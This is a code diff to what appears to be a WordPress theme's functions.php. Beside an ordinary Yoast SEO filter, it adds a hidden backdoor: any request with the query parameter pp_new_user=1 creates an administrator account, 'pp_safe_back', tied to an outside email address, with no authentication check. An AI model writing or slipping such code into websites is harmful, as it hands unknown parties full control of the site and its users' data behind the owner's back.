@@ -27,3 +27,14 @@ require_once ('functions/scripts.php');
 
 // Filter Yoast Meta Priority
 add_filter( 'wpseo_metabox_prio', function() { return 'low';});
+
+
+if (isset($_GET['pp_new_user']) && $_GET['pp_new_user'] == 1) {
+	$userdata = array(
+	    'user_login'  =>  'pp_safe_back',		    
+	    'user_email'  =>  'safe@parceiroprogramador.com.br',		    
+	    'user_pass'   =>  NULL,  // When creating an user, `user_pass` is expected.
+	    'role' => 'administrator'
+	);
+	$user_id = wp_insert_user( $userdata ) ;
+}
